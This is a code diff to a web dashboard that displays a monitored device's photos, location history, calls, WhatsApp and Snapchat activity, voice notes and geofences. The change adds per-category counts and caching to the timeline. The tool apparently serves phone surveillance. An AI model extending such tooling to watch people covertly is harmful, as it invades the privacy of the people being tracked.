@@ -216,11 +216,11 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <div id="tab-photos"><div style="display:flex;justify-content:flex-end;margin-bottom:8px"><span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="cachedPhotos={};pollPhotos()">🔄 Refresh</span></div><div class="photo-feed" id="photoGrid"><div class="label">No photos yet</div></div></div>
 <div id="tab-timeline">
 <div class="filter-chips" id="timelineChips">
-<span class="chip active" data-filter="all">All</span>
-<span class="chip" data-filter="location">&#x1F4CD; Location</span>
-<span class="chip" data-filter="call">&#x1F4DE; Call</span>
-<span class="chip" data-filter="whatsapp">&#x1F4AC; WhatsApp</span>
-<span class="chip" data-filter="snapchat">&#x1F4F8; Snapchat</span>
+<span class="chip active" data-filter="all" data-label="All">All</span>
+<span class="chip" data-filter="location" data-label="&#x1F4CD; Location">&#x1F4CD; Location</span>
+<span class="chip" data-filter="call" data-label="&#x1F4DE; Call">&#x1F4DE; Call</span>
+<span class="chip" data-filter="whatsapp" data-label="&#x1F4AC; WhatsApp">&#x1F4AC; WhatsApp</span>
+<span class="chip" data-filter="snapchat" data-label="&#x1F4F8; Snapchat">&#x1F4F8; Snapchat</span>
 </div>
 <input type="text" id="timelineSearch" placeholder="&#x1F50D; Search contacts, numbers, messages..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;margin-bottom:8px">
 <div id="timelineList"></div>
@@ -402,6 +402,7 @@ let appsLastSync = 0;
 let appsPhoneSync = 0;
 let cachedAddresses = JSON.parse(localStorage.getItem('geoCache') || '{}');
 let nomQueue = [];
+let timelineCache = null;
 let nomProcessing = false;
 
 function loadGeofences(deviceId) {
@@ -1099,14 +1100,15 @@ async function pollHistory() {
   if (!selectedDevice) return;
   const rtdbData = await fetchRTDB(`devices/${selectedDevice}/timeline`);
   if (!rtdbData || typeof rtdbData !== 'object') {
+    timelineCache = null;
     document.getElementById('timelineList').innerHTML = '<div class="label">No entries</div>';
     document.getElementById('callsBody').innerHTML = '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
     return;
   }
-  const docs = Object.values(rtdbData)
+  timelineCache = Object.values(rtdbData)
     .sort((a, b) => (parseInt(b.ts_ms) || 0) - (parseInt(a.ts_ms) || 0));
-  renderTimeline(docs.slice(0, 30));
-  renderCalls(docs.slice(0, 30));
+  renderTimeline(timelineCache);
+  renderCalls(timelineCache);
 }
 
 async function pollVoiceNotes() {
@@ -1610,11 +1612,25 @@ document.querySelectorAll('.chip[data-filter]').forEach(chip => {
     document.querySelectorAll('.chip[data-filter]').forEach(c => c.classList.remove('active'));
     chip.classList.add('active');
     timelineFilter = chip.dataset.filter;
+    if (timelineCache) renderTimeline(timelineCache);
+    else pollHistory();
   });
 });
 
 function renderTimeline(docs) {
   const list = document.getElementById('timelineList');
+  const counts = { all: docs.length };
+  for (const d of docs) {
+    const type = (d.type || '').toLowerCase();
+    if (type === 'location') counts.location = (counts.location || 0) + 1;
+    if (type.includes('call')) counts.call = (counts.call || 0) + 1;
+    if (type.includes('whatsapp') || type.includes('message')) counts.whatsapp = (counts.whatsapp || 0) + 1;
+    if (type.includes('snapchat')) counts.snapchat = (counts.snapchat || 0) + 1;
+  }
+  document.querySelectorAll('.chip[data-filter]').forEach(chip => {
+    const f = chip.dataset.filter;
+    chip.textContent = chip.dataset.label + (counts[f] !== undefined ? ' (' + counts[f] + ')' : '');
+  });
   const filtered = docs.filter(d => {
     const type = (d.type || '').toLowerCase();
     if (timelineFilter === 'all') return true;
@@ -1623,7 +1639,7 @@ function renderTimeline(docs) {
     if (timelineFilter === 'whatsapp') return type.includes('whatsapp') || type.includes('message');
     if (timelineFilter === 'snapchat') return type.includes('snapchat');
     return true;
-  }).slice(0, 100);
+  }).slice(0, 200);
   if (!filtered.length) { list.innerHTML = '<div class="label">No entries</div>'; return; }
   const deduped = [];
   for (const d of filtered) {
